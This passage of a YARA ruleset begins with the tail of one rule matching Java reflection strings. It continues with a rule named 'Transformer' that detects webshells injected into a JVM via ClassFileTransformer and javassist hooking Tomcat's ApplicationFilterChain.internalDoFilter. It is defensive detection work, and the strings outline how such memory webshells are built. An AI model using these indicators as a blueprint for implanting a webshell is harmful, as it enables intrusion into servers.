		$exec4 = "getContextClassLoader" ascii fullword
		$exec5 = "setAccessible" ascii fullword
	condition:
		all of them 
}

rule Transformer{
	meta:
		description = "indect jar webshell detce"

	strings:
		$constant1 = "ClassFileTransformer"
		$constant2 = "transform"
		$constant3 = "ClassLoader"
		$constant4 = "ProtectionDomain"
		$constant5 = "ApplicationFilterChain"
		$constant6 = "internalDoFilter"
		$constant7 = "javassist"
		$constant8 = "ClassClassPath"
		$constant9 = "getDeclaredMethod"
		$constant10 = "source.txt"
		$constant11 = "readSource"
	condition:
		all of them

}